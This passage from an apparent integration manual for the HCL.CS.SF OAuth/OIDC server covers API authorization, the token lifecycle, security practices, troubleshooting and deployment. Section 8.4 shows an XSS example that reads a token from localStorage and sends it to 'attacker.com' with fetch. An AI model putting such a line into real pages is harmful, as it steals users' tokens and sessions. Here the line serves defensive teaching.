    options.AddPolicy("AdminOnly", policy =>
        policy.RequireRole("Admin"));
});

var app = builder.Build();

app.UseAuthentication();
app.UseAuthorization();

app.MapControllers();
app.Run();
```

**Protected Controller:**
```csharp
[ApiController]
[Route("api/[controller]")]
public class DataController : ControllerBase
{
    // Requires valid JWT with any scope
    [HttpGet]
    [Authorize]
    public IActionResult Get()
    {
        var userId = User.FindFirst("sub")?.Value;
        return Ok(new { message = "Hello", userId });
    }

    // Requires api.read scope
    [HttpGet("public")]
    [Authorize(Policy = "ReadAccess")]
    public IActionResult GetPublic()
    {
        return Ok(new { data = "public data" });
    }

    // Requires api.write scope
    [HttpPost]
    [Authorize(Policy = "WriteAccess")]
    public IActionResult Create([FromBody] CreateRequest request)
    {
        return Ok(new { created = true });
    }

    // Requires Admin role
    [HttpDelete("{id}")]
    [Authorize(Policy = "AdminOnly")]
    public IActionResult Delete(int id)
    {
        return Ok(new { deleted = id });
    }
}
```

---

## 7. Token Lifecycle Explained

### 7.1 Authorization Code Creation

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    AUTHORIZATION CODE LIFECYCLE                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  CREATION                                                                   │
│  ────────                                                                   │
│  • Generated when user successfully authenticates                          │
│  • Bound to: client_id, redirect_uri, code_challenge (PKCE)                │
│  • Stored in database: HCL.CS.SF_SecurityTokens                               │
│  • Lifetime: 60-600 seconds (configurable)                                 │
│  • Format: Random 32-byte string, Base64URL encoded                        │
│                                                                             │
│  CONSUMPTION                                                                │
│  ───────────                                                                │
│  • Can only be exchanged once                                              │
│  • Must include matching code_verifier (if PKCE used)                      │
│  • Invalid after first use                                                 │
│  • Invalid after expiration                                                │
│                                                                             │
│  STORAGE                                                                    │
│  ───────                                                                    │
│  Table: HCL.CS.SF_SecurityTokens                                              │
│  • Key: Hash of authorization code                                         │
│  • TokenType: "authorization_code"                                         │
│  • CreationTime: UTC timestamp                                             │
│  • ExpiresAt: Lifetime in seconds                                          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 7.2 Access Token Issuance

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    ACCESS TOKEN ISSUANCE                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  TRIGGER:                                                                   │
│  • Authorization code exchange                                             │
│  • Refresh token exchange                                                  │
│  • Client credentials flow                                                 │
│                                                                             │
│  CONTENT (JWT Claims):                                                      │
│  ─────────────────────                                                      │
│  {                                                                          │
│    "iss": "https://auth.yourcompany.com",    // Issuer                     │
│    "sub": "user-uuid",                       // Subject (user ID)          │
│    "aud": "yourcompany.api",                 // Audience                   │
│    "exp": 1704067200,                        // Expiration                 │
│    "iat": 1704063600,                        // Issued at                  │
│    "jti": "unique-token-id",                 // JWT ID                     │
│    "client_id": "my-app",                    // Client identifier          │
│    "scope": "openid profile api.read",       // Granted scopes             │
│    "role": "User"                            // User role                  │
│  }                                                                          │
│                                                                             │
│  SIGNATURE:                                                                 │
│  ─────────                                                                  │
│  • Algorithm: RS256 (RSA-SHA256) or ES256 (ECDSA-SHA256)                   │
│  • Key ID included in JWT header                                           │
│  • Public key available at /.well-known/jwks                               │
│                                                                             │
│  LIFETIME:                                                                  │
│  ─────────                                                                  │
│  • Default: 15 minutes (900 seconds)                                       │
│  • Maximum: 15 minutes (enforced)                                          │
│  • Configurable per client                                                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 7.3 Refresh Token Rotation

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    REFRESH TOKEN ROTATION                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  INITIAL LOGIN                                                              │
│  ─────────────                                                              │
│  User authenticates → Receives:                                            │
│  • Access Token (15 min)                                                   │
│  • Refresh Token #1 (long-lived)                                           │
│                                                                             │
│  ACCESS TOKEN EXPIRES                                                       │
│  ────────────────────                                                       │
│  App calls /token with:                                                    │
│  • grant_type=refresh_token                                                │
│  • refresh_token=Refresh Token #1                                          │
│                                                                             │
│  HCL.CS.SF PROCESSING                                                          │
│  ────────────────                                                           │
│  1. Validate Refresh Token #1 exists                                       │
│  2. Check it hasn't been consumed (ConsumedAt == null)                     │
│  3. Check it hasn't expired                                                │
│  4. Mark Refresh Token #1 as consumed (ConsumedAt = now)                   │
│  5. Generate Refresh Token #2 (new random value)                           │
│  6. Issue new Access Token + Refresh Token #2                              │
│                                                                             │
│  RESPONSE                                                                   │
│  ────────                                                                   │
│  {                                                                          │
│    "access_token": "new-jwt...",                                           │
│    "refresh_token": "Refresh Token #2",                                    │
│    "expires_in": 900                                                       │
│  }                                                                          │
│                                                                             │
│  REUSE DETECTION                                                            │
│  ───────────────                                                            │
│  If Refresh Token #1 is presented again:                                   │
│  • Detected (ConsumedAt is set)                                            │
│  • Refresh Token #2 is also revoked                                        │
│  • All user tokens for this client marked for revocation                   │
│  • Response: {"error": "invalid_grant"}                                    │
│  • User must re-authenticate                                               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 7.4 Token Reuse Detection

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    TOKEN REUSE DETECTION                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  SCENARIO: Refresh Token Theft                                             │
│                                                                             │
│  1. Attacker steals Refresh Token #1                                       │
│  2. User refreshes token (gets Refresh Token #2)                           │
│     → Refresh Token #1 marked consumed                                     │
│  3. Attacker tries to use Refresh Token #1                                 │
│     → DETECTED!                                                            │
│                                                                             │
│  DETECTION LOGIC:                                                           │
│  ────────────────                                                           │
│  if (token.ConsumedAt.HasValue)                                            │
│  {                                                                          │
│      // Token already used                                                 │
│      HandleReuseDetection(token);                                          │
│      return Error("invalid_grant");                                        │
│  }                                                                          │
│                                                                             │
│  HANDLE REUSE:                                                              │
│  ────────────                                                               │
│  1. Find all tokens for this user + client                                 │
│  2. Mark all as TokenReuseDetected = true                                  │
│  3. Log security event                                                     │
│  4. Alert security team (if configured)                                    │
│                                                                             │
│  IMPACT:                                                                    │
│  ───────                                                                    │
│  • Attacker cannot use stolen token                                        │
│  • Legitimate user is forced to re-authenticate                            │
│  • Session is fully terminated                                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 7.5 Revocation Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    TOKEN REVOCATION FLOW                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  SCENARIOS:                                                                 │
│  ──────────                                                                 │
│  • User clicks "Logout"                                                    │
│  • Admin revokes user access                                               │
│  • Password change detected                                                │
│  • Security incident response                                              │
│                                                                             │
│  REVOCATION REQUEST:                                                        │
│  ──────────────────                                                         │
│  POST /connect/revocation                                                   │
│  Content-Type: application/x-www-form-urlencoded                            │
│  Authorization: Basic {base64(client_id:client_secret)}                     │
│                                                                             │
│  token={token_value}                                                        │
│  &token_type_hint=refresh_token  (optional)                                 │
│                                                                             │
│  PROCESSING:                                                                │
│  ──────────                                                                 │
│  1. Authenticate client                                                    │
│  2. Look up token in database                                              │
│  3. If found: Delete from database                                         │
│  4. If not found: Return 200 anyway (idempotency)                          │
│                                                                             │
│  RESPONSE:                                                                  │
│  ────────                                                                   │
│  HTTP/1.1 200 OK                                                            │
│  (No body per RFC 7009)                                                     │
│                                                                             │
│  VERIFICATION:                                                              │
│  ────────────                                                               │
│  POST /connect/introspect                                                   │
│  token={revoked_token}                                                      │
│                                                                             │
│  Response: {"active": false}                                                │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 7.6 Introspection Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    TOKEN INTROSPECTION FLOW                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  WHEN TO USE:                                                               │
│  ────────────                                                               │
│  • API Gateway validating tokens                                           │
│  • Opaque tokens (not JWT)                                                 │
│  • Getting token details (user, scopes)                                    │
│                                                                             │
│  REQUEST:                                                                   │
│  ───────                                                                    │
│  POST /connect/introspect                                                   │
│  Content-Type: application/x-www-form-urlencoded                            │
│  Authorization: Basic {base64(client_id:client_secret)}                     │
│                                                                             │
│  token={token_value}                                                        │
│  &token_type_hint=access_token  (optional)                                  │
│                                                                             │
│  PROCESSING:                                                                │
│  ──────────                                                                 │
│  1. Authenticate client                                                    │
│  2. If JWT: Parse and validate signature, expiry                           │
│  3. If opaque token: Look up in database                                   │
│  4. Check if revoked (in revocation table)                                 │
│                                                                             │
│  ACTIVE TOKEN RESPONSE:                                                     │
│  ─────────────────────                                                      │
│  {                                                                          │
│    "active": true,                                                          │
│    "client_id": "my-app",                                                   │
│    "username": "john.doe@example.com",                                      │
│    "token_type": "Bearer",                                                  │
│    "exp": 1704067200,                                                       │
│    "iat": 1704063600,                                                       │
│    "scope": "openid profile api.read",                                      │
│    "sub": "user-uuid"                                                       │
│  }                                                                          │
│                                                                             │
│  INACTIVE TOKEN RESPONSE:                                                   │
│  ───────────────────────                                                    │
│  {                                                                          │
│    "active": false                                                          │
│  }                                                                          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 8. Security Best Practices

### 8.1 Why S256 is Mandatory

**The Attack It Prevents:**
```
Without PKCE:
1. User starts login on legitimate app
2. Attacker intercepts authorization code (via XSS, network sniffing, etc.)
3. Attacker exchanges code for tokens
4. Attacker now has user's access

With PKCE:
1. User starts login, app generates code_verifier (random secret)
2. App sends code_challenge = SHA256(code_verifier)
3. Attacker intercepts authorization code
4. Attacker tries to exchange code → FAILS (needs code_verifier)
5. code_verifier never left the app (sent only in POST body)
```

**Why S256 and not plain:**
- `plain`: code_challenge = code_verifier (no protection if intercepted)
- `S256`: code_challenge = SHA256(code_verifier) (computationally infeasible to reverse)

### 8.2 Why Asymmetric Signing is Enforced

**Symmetric (HS256) Problem:**
```
Both sides know the secret:
  HCL.CS.SF ──shared secret──► Client
  
If client is compromised, attacker can:
1. Steal shared secret
2. Forge tokens
3. Impersonate any user
```

**Asymmetric (RS256/ES256) Solution:**
```
Different keys:
  HCL.CS.SF (private key) ──signs──► JWT
  JWT ──validated with──► Public key (available to all)
  
Even if client is compromised:
• Attacker only has public key (can verify, cannot sign)
• Cannot forge tokens
• HCL.CS.SF private key stays secure
```

### 8.3 Why Refresh Token Rotation Matters

**Without Rotation:**
```
Day 1: Attacker steals refresh token
Day 30: Attacker still has valid token (can refresh indefinitely)
Day 60: User finally notices (maybe)
```

**With Rotation:**
```
Day 1: Attacker steals refresh token
Day 1: User refreshes token (gets new one, old marked consumed)
Day 1: Attacker tries old token → DETECTED!
• All tokens revoked
• Security team alerted
• Attacker locked out immediately
```

### 8.4 Why Tokens Must Not Be Stored in localStorage

**The Risk:**
```javascript
// XSS Attack
const token = localStorage.getItem('access_token');
// Attacker's script steals token
fetch('https://attacker.com/steal?token=' + token);
```

**The Solution:**
```javascript
// Store in memory only
let accessToken = null; // JavaScript variable

// Token lost on page refresh → use refresh token
// Attacker's XSS cannot access JS variables from another script context
// (unless they completely compromise the page, in which case they don't
//  need the token - they can make requests directly)
```

**Best Practice:**
- Access tokens: In-memory only (oidc-client-ts handles this)
- Refresh tokens: Secure storage handled by library
- On page refresh: Silent token renewal using iframe

### 8.5 How to Handle Logout Securely

**Server-Side (ASP.NET Core):**
```csharp
public async Task<IActionResult> Logout()
{
    // 1. Revoke refresh token
    var refreshToken = await HttpContext.GetTokenAsync("refresh_token");
    if (refreshToken != null)
    {
        await RevokeTokenAsync(refreshToken);
    }

    // 2. Sign out of authentication scheme
    await HttpContext.SignOutAsync("Cookies");
    await HttpContext.SignOutAsync("OpenIdConnect");

    // 3. Redirect to HCL.CS.SF logout (ends SSO session)
    return SignOut(
        new AuthenticationProperties { RedirectUri = "/" },
        "Cookies", "OpenIdConnect");
}
```

**Client-Side (SPA):**
```javascript
const logout = async () => {
  // 1. Revoke tokens
  await userManager.revokeTokens();
  
  // 2. Sign out (redirects to HCL.CS.SF logout page)
  await userManager.signoutRedirect();
};
```

**Why revoke tokens:**
- Prevents stolen refresh tokens from being used
- Ends session on all devices (if using shared session)
- Required for compliance in many industries

### 8.6 How to Rotate Signing Keys

**Step-by-Step:**

1. **Generate New Key Pair**
```bash
# RSA Key
openssl genrsa -out new-rsa-key.pem 2048
openssl req -new -x509 -key new-rsa-key.pem -out new-rsa-cert.pem -days 365

# Convert to Base64 for environment variable
export HCL.CS.SF_RSA_SIGNING_CERT_BASE64=$(base64 new-rsa-cert.pem)
export HCL.CS.SF_RSA_SIGNING_KID="HCL.CS.SF-rsa-2026-q2"
```

2. **Deploy with Both Keys**
- Keep old key active
- Add new key to environment
- JWKS endpoint now returns both public keys

3. **Wait 24 Hours**
- Allow JWKS caching to expire
- All clients now have both keys

4. **Switch to New Key**
- Update configuration to use new key ID for signing
- Old key still published for validation

5. **Remove Old Key (after 7 days)**
- Ensure all old tokens have expired
- Remove old key from environment

### 8.7 How to Monitor Suspicious Activity

**Key Metrics to Watch:**

| Metric | Threshold | Action |
|--------|-----------|--------|
| Failed authentication rate | >5/min | Alert security team |
| Token reuse detection | Any occurrence | Immediate investigation |
| Rate limit rejections | >100/min | Consider IP block |
| Invalid signature failures | >10/min | Check for key compromise |
| Off-hours admin access | Any occurrence | Verify with admin |

**Log Analysis:**
```bash
# Find token reuse attempts
grep "TokenReuseDetected" /var/log/HCL.CS.SF/app.log

# Find failed auth by IP
grep "Authentication failed" /var/log/HCL.CS.SF/app.log | \
  awk '{print $5}' | sort | uniq -c | sort -rn | head -10

# Find rate limit hits
grep "Rate limit exceeded" /var/log/HCL.CS.SF/app.log
```

---

## 9. Common Use Cases

### 9.1 SaaS Application with Multiple APIs

**Architecture:**
```
┌──────────────┐         ┌──────────────┐         ┌──────────────┐
│   Web App    │────────►│  API Gateway │────────►│  Billing API │
│   (React)    │         │   (Kong)     │         └──────────────┘
└──────────────┘         └──────┬───────┘         ┌──────────────┐
                                │                 │  User API    │
                                │                 └──────────────┘
                                │                 ┌──────────────┐
                                │                 │  Report API  │
                                │                 └──────────────┘
                                │
                         ┌──────┴──────┐
                         │   HCL.CS.SF    │
                         │  (Tokens)   │
                         └─────────────┘
```

**Flow:**
1. User logs in via HCL.CS.SF
2. Receives access token with scopes: `billing.read user.read reports.read`
3. API Gateway validates token with HCL.CS.SF
4. Routes request to appropriate API
5. Each API checks for required scope

**Why HCL.CS.SF Fits:**
- Central authentication for all APIs
- Scope-based access control
- Token validation at gateway

### 9.2 Microservices Architecture

**Architecture:**
```
┌──────────────┐
│   Client     │
│   (Mobile)   │
└──────┬───────┘
       │
       ▼
┌──────────────┐      ┌──────────────┐      ┌──────────────┐
│   API GW     │─────►│  Order Svc   │─────►│  Payment Svc │
│  (Validate)  │      │ (user token) │      │ (service ac) │
└──────┬───────┘      └──────────────┘      └──────────────┘
       │
       ▼
┌──────────────┐
│   HCL.CS.SF     │
└──────────────┘
```

**Service-to-Service:**
```csharp
// Order Service calls Payment Service
var token = await GetClientCredentialsTokenAsync(
    clientId: "order-service",
    scope: "payment.process");

var response = await httpClient
    .WithAuthorization(token)
    .PostAsync("/api/payments", paymentRequest);
```

**Why HCL.CS.SF Fits:**
- Client credentials for service auth
- Different scopes for different services
- No shared secrets between services

### 9.3 Internal Enterprise Portal

**Architecture:**
```
┌─────────────────────────────────────────────┐
│           Corporate Network                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
│  │  HR App  │  │ IT Admin │  │ Finance  │  │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  │
│       │             │             │        │
│       └─────────────┼─────────────┘        │
│                     │                      │
│              ┌──────┴──────┐               │
│              │   HCL.CS.SF    │               │
│              │  (SSO)      │               │
│              └─────────────┘               │
│                     │                      │
│              ┌──────┴──────┐               │
│              │    LDAP     │               │
│              │   (AD)      │               │
│              └─────────────┘               │
└─────────────────────────────────────────────┘
```

**Configuration:**
- HCL.CS.SF connects to Active Directory
- Employees use corporate credentials
- Single sign-on across all internal apps
- Session expires after 8 hours

**Why HCL.CS.SF Fits:**
- LDAP integration
- Session management
- Central audit trail

### 9.4 Mobile App Backend

**Architecture:**
```
┌──────────────┐         ┌──────────────┐         ┌──────────────┐
│  Mobile App  │────────►│  Backend API │────────►│  Database    │
│  (iOS/Andr)  │         │  (.NET)      │         │              │
└──────────────┘         └──────┬───────┘         └──────────────┘
                                │
                         ┌──────┴──────┐
                         │   HCL.CS.SF    │
                         │  (PKCE)     │
                         └─────────────┘
```

**PKCE Flow:**
```
1. App generates code_verifier (random)
2. App computes code_challenge = SHA256(code_verifier)
3. App opens browser: /authorize?code_challenge=xxx&method=S256
4. User authenticates
5. App receives authorization code
6. App exchanges code + code_verifier for tokens
```

**Why HCL.CS.SF Fits:**
- PKCE mandatory for mobile apps
- Refresh tokens for offline access
- Token rotation for security

### 9.5 API Gateway Enforcement

**Architecture:**
```
                    ┌──────────────┐
                    │   Client     │
                    └──────┬───────┘
                           │
┌──────────────────────────┼──────────────────────────┐
│                          ▼                          │
│  ┌───────────────────────────────────────────────┐  │
│  │              Kong API Gateway                  │  │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐       │  │
│  │  │ JWT     │  │ Rate    │  │ Scope   │       │  │
│  │  │ Validate│  │ Limit   │  │ Check   │       │  │
│  │  └────┬────┘  └────┬────┘  └────┬────┘       │  │
│  │       └─────────────┴─────────────┘          │  │
│  │                          │                   │  │
│  │                          ▼                   │  │
│  │              ┌─────────────────────┐         │  │
│  │              │  Introspect HCL.CS.SF  │         │  │
│  │              │  (if JWT invalid)   │         │  │
│  │              └─────────────────────┘         │  │
│  └───────────────────────────────────────────────┘  │
│                          │                          │
│              ┌───────────┼───────────┐              │
│              ▼           ▼           ▼              │
│         ┌────────┐  ┌────────┐  ┌────────┐         │
│         │Orders  │  │Users   │  │Products│         │
│         └────────┘  └────────┘  └────────┘         │
└─────────────────────────────────────────────────────┘
```

**Kong Plugin Configuration:**
```yaml
plugins:
  - name: jwt
    config:
      uri_param_names: []
      cookie_names: []
      key_claim_name: iss
      secret_is_base64: false
      claims_to_verify:
        - exp
      maximum_expiration: 900
```

**Why HCL.CS.SF Fits:**
- JWKS endpoint for public key distribution
- Introspection for opaque tokens
- Central token validation

### 9.6 Admin Panel + RBAC

**Architecture:**
```
┌──────────────┐
│  Admin Panel │
│  (React)     │
└──────┬───────┘
       │
       ▼
┌──────────────┐      ┌──────────────┐
│   Admin API  │─────►│   HCL.CS.SF     │
│  (.NET)      │      │  (Roles:    │
└──────────────┘      │   Admin,    │
                      │   Editor,   │
                      │   Viewer)   │
                      └─────────────┘
```

**Role-Based Access:**
```csharp
[Authorize(Roles = "Admin")]
[HttpPost("users")]
public IActionResult CreateUser() { ... }

[Authorize(Roles = "Admin,Editor")]
[HttpPut("content/{id}")]
public IActionResult UpdateContent(int id) { ... }

[Authorize(Roles = "Admin,Editor,Viewer")]
[HttpGet("content/{id}")]
public IActionResult GetContent(int id) { ... }
```

**Why HCL.CS.SF Fits:**
- Role claims in JWT
- Flexible permission model
- Central user management

---

## 10. Troubleshooting Guide

### 10.1 Common Errors

#### Error: "invalid_client"

**Symptoms:**
```json
{
  "error": "invalid_client",
  "error_description": "Client authentication failed"
}
```

**Causes:**
1. Wrong client_id
2. Wrong client_secret
3. Client secret not sent via Basic Auth
4. URL-encoding issues in credentials

**Diagnosis:**
```bash
# Verify client credentials
curl -X POST https://auth.yourcompany.com/connect/token \
  -H "Authorization: Basic $(echo -n 'client_id:client_secret' | base64)" \
  -d "grant_type=client_credentials"

# Check Base64 encoding
echo -n 'client_id:client_secret' | base64
# Should match what's sent in header
```

**Fix:**
- Verify client is registered
- Check secret hasn't expired
- Ensure Basic Auth header format: `Basic base64(client_id:client_secret)`
- URL-encode client_id and client_secret if they contain special characters

---

#### Error: "invalid_grant" (PKCE)

**Symptoms:**
```json
{
  "error": "invalid_grant",
  "error_description": "code_verifier mismatch"
}
```

**Causes:**
1. Wrong code_verifier sent
2. code_challenge was computed incorrectly
3. Authorization code expired
4. Authorization code already used

**Diagnosis:**
```javascript
// Verify code_challenge computation
const crypto = require('crypto');

const code_verifier = 'your-verifier';
const code_challenge = crypto
  .createHash('sha256')
  .update(code_verifier)
  .digest('base64url'); // Note: base64url, not base64

console.log(code_challenge);
// Should match what was sent to /authorize
```

**Fix:**
- Ensure code_verifier is stored securely during auth flow
- Use base64url encoding (not standard base64)
- Exchange code immediately (don't wait)

---

#### Error: "invalid_audience"

**Symptoms:**
```json
{
  "error": "invalid_token",
  "error_description": "Audience validation failed"
}
```

**Causes:**
1. API expects different audience than token contains
2. Token was issued for different API
3. Configuration mismatch

**Diagnosis:**
```bash
# Decode JWT (without validation)
echo "eyJhbGciOiJSUzI1NiIsInR5cCI6ImF0K2p3dCJ9..." | base64 -d

# Look for "aud" claim
# Should match what API expects
```

**Fix:**
```csharp
// In API configuration, ensure audience matches
tokenValidationParameters = new TokenValidationParameters
{
    ValidAudience = "yourcompany.api", // Must match HCL.CS.SF config
    // ...
};
```

---

#### Error: "Token expired"

**Symptoms:**
```json
{
  "error": "invalid_token",
  "error_description": "Token has expired"
}
```

**Diagnosis:**
```bash
# Check token expiration
echo "eyJ..." | base64 -d | jq '.exp'
# Compare to current timestamp
date +%s
```

**Fix:**
- Implement token refresh before expiry
- Handle 401 responses by refreshing token
- Check clock skew (JWT allows 5 minutes tolerance)

---

#### Error: CORS Issues

**Symptoms:**
```
Access to fetch at 'https://auth.yourcompany.com/connect/token' 
from origin 'http://localhost:3000' has been blocked by CORS policy
```

**Diagnosis:**
```bash
# Check CORS headers
curl -I -X OPTIONS \
  -H "Origin: http://localhost:3000" \
  -H "Access-Control-Request-Method: POST" \
  https://auth.yourcompany.com/connect/token

# Should see: Access-Control-Allow-Origin: http://localhost:3000
```

**Fix:**
```csharp
// Add to HCL.CS.SF configuration
builder.Services.AddCors(options =>
{
    options.AddPolicy("Dev", policy =>
    {
        policy.WithOrigins("http://localhost:3000")
            .AllowAnyMethod()
            .AllowAnyHeader();
    });
});

// In production, be specific:
.WithOrigins("https://app.yourcompany.com")
.WithMethods("GET", "POST")
.WithHeaders("Authorization", "Content-Type")
```

---

#### Error: Introspection returns "active": false

**Symptoms:**
Token appears valid but introspection says inactive.

**Causes:**
1. Token was revoked
2. Token expired
3. Wrong token type (access vs refresh)
4. Client not authorized to introspect this token

**Diagnosis:**
```bash
# Check if token is in revocation list
# Query HCL.CS.SF database:
SELECT * FROM HCL.CS.SF_SecurityTokens 
WHERE Key = 'token-hash' AND TokenType = 'access_token';

# Should return no rows (token deleted when revoked)
```

**Fix:**
- Get new token (re-authenticate if refresh token also revoked)
- Check client permissions for introspection

---

### 10.2 Debugging Checklist

1. **Enable detailed logging:**
```csharp
// In Program.cs
builder.Logging.AddConsole();
builder.Logging.SetMinimumLevel(LogLevel.Debug);

// In JWT validation
options.Events = new JwtBearerEvents
{
    OnAuthenticationFailed = context =>
    {
        Console.WriteLine($"Auth failed: {context.Exception}");
        return Task.CompletedTask;
    },
    OnTokenValidated = context =>
    {
        Console.WriteLine($"Token validated for: {context.Principal.Identity.Name}");
        return Task.CompletedTask;
    }
};
```

2. **Verify discovery endpoint:**
```bash
curl https://auth.yourcompany.com/.well-known/openid-configuration | jq
```

3. **Test with simple client:**
```bash
# Get token
curl -X POST https://auth.yourcompany.com/connect/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=client_credentials" \
  -d "client_id=test" \
  -d "client_secret=test" \
  -d "scope=api.read"

# Introspect token
curl -X POST https://auth.yourcompany.com/connect/introspect \
  -u "test:test" \
  -d "token=YOUR_TOKEN"
```

4. **Check clock synchronization:**
```bash
# All servers must have synchronized time
ntpdate -q pool.ntp.org
```

---

## 11. FAQ

### Does HCL.CS.SF support multi-tenancy?

**Answer:** Not natively. Each tenant requires a separate HCL.CS.SF instance or you can implement tenant isolation using:
- Separate client registrations per tenant
- Custom claims for tenant identification
- Tenant-scoped API resources

Future versions may add native multi-tenancy.

### Can I use my own signing certificate?

**Answer:** Yes. Provide your certificate via environment variables:
```bash
export HCL.CS.SF_RSA_SIGNING_CERT_BASE64=$(base64 your-cert.pfx)
export HCL.CS.SF_SIGNING_CERT_PASSWORD="your-password"
```

Requirements:
- RSA 2048-bit minimum
- Contains private key
- Valid (not expired)

### How often should I rotate keys?

**Answer:**
- Signing keys: Every 90 days
- Client secrets: Every 60 days
- Database credentials: Every 90 days

Emergency rotation:
- Immediately if compromise suspected
- Within 24 hours of employee departure (if they had access)

### Does HCL.CS.SF store passwords?

**Answer:** Yes, user passwords are stored in the database with:
- Argon2id hashing (memory-hard)
- Per-user salt
- Configurable iteration count

Password requirements are configurable (length, complexity, history).

### Can it replace Auth0 / Okta?

**Answer:** For many use cases, yes. Consider HCL.CS.SF if:
- You need on-premises deployment
- You want to avoid vendor lock-in
- You have specific compliance requirements
- You want full control over the code

Auth0/Okta may be better if:
- You need advanced features (rules engine, advanced MFA)
- You don't want to manage infrastructure
- You need 99.99% SLA guarantees

### Does it support social login?

**Answer:** Not natively. You can implement it by:
1. Using ASP.NET Core's external auth providers
2. Linking external accounts to HCL.CS.SF users
3. Using HCL.CS.SF for session management

Future versions may add native social login providers.

### What databases are supported?

**Answer:**
- SQL Server 2019+
- MySQL 8.0+
- PostgreSQL 13+
- SQLite 3 (development only)

### Can I customize the login page?

**Answer:** Yes. The login page is part of the demo server and can be fully customized:
- Modify views in `demos/HCL.CS.SF.Demo.Server/Views/`
- Add CSS/JS to `wwwroot/`
- Or build your own login UI using HCL.CS.SF APIs

### How do I backup HCL.CS.SF?

**Answer:**
1. Database backup (standard SQL backup)
2. Signing keys (securely stored, export from HSM/Vault)
3. Configuration (environment variables, infrastructure as code)

Token data doesn't need backup (temporary by nature).

### Is there an admin UI?

**Answer:** A basic admin interface is available in the demo server at `/admin`. For production, consider:
- Building custom admin interface using HCL.CS.SF APIs
- Using the database directly (with caution)
- Future: Enterprise admin panel (roadmap item)

---

## 12. Deployment Checklist

### Pre-Deployment

- [ ] TLS certificate obtained from trusted CA
- [ ] Database provisioned and accessible
- [ ] Signing certificates generated and secured
- [ ] Environment variables documented
- [ ] Rate limiting configured
- [ ] CORS origins explicitly listed
- [ ] Health check endpoints tested

### Security Configuration

- [ ] `HCL.CS.SF_SIGNING_CERT_PASSWORD` is strong (>32 chars, random)
- [ ] Database connection string uses encrypted connection
- [ ] No secrets in configuration files (environment only)
- [ ] Security headers verified (X-Frame-Options, CSP, etc.)
- [ ] Rate limiting active (test with `ab` or `wrk`)
- [ ] CORS restricted to known origins only

### Operational Readiness

- [ ] Logging configured (file or database)
- [ ] Log retention policy set
- [ ] Health checks (`/health/live`) responding
- [ ] Monitoring alerts configured
- [ ] Backup procedure documented
- [ ] Key rotation procedure documented
- [ ] Incident response plan ready

### Testing

- [ ] Authorization code flow tested end-to-end
- [ ] Client credentials flow tested
- [ ] Token refresh tested
- [ ] Token revocation tested
- [ ] Introspection endpoint tested
- [ ] JWKS endpoint accessible
- [ ] Discovery endpoint returns correct URLs
- [ ] Logout flow clears session

### Documentation

- [ ] Client registration procedure documented
- [ ] Integration guide distributed to teams
- [ ] Runbook for common issues created
- [ ] Contact information for on-call documented

---

## Document Information

**Version:** 1.0  
**Last Updated:** February 2026  
**Maintained By:** HCL.CS.SF Documentation Team  
**Feedback:** Submit issues to documentation repository

---

*This manual provides practical guidance for integrating with and deploying HCL.CS.SF. For additional support, refer to the API reference documentation or contact the development team.*
